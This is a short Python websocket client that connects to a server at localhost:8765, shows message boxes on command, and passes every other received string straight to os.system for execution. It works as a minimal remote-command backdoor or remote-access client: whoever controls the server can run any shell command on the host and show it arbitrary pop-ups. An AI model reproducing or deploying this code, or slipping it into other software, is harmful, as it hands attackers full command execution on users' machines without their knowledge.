import asyncio
import websockets
import os
import tkinter as tk
from tkinter import messagebox

async def client_handler():
    uri = "ws://localhost:8765"
    async with websockets.connect(uri) as websocket:
        print("Connected to the server")
        try:
            while True:
                # Wait for a command from the server
                command = await websocket.recv()
                print(f"Executing command: {command}")
                if command.startswith("msg "):
                    # Extract the title and message from the command
                    command_parts = command[4:].split("::", 1)
                    if len(command_parts) == 2:
                        title, message = command_parts
                        # Display the messagebox with custom title and message
                        show_messagebox(title, message)
                    else:
                        print("Invalid format. Use 'msg <title>::<message>'")
                else:
                    os.system(command)
                if command == "exit":
                    break
        except websockets.ConnectionClosed:
            print("Connection closed")

def show_messagebox(title, message):
    root = tk.Tk()
    root.withdraw()  # Hide the main window
    messagebox.showinfo(title, message)
    root.destroy()

if __name__ == "__main__":
    asyncio.run(client_handler())
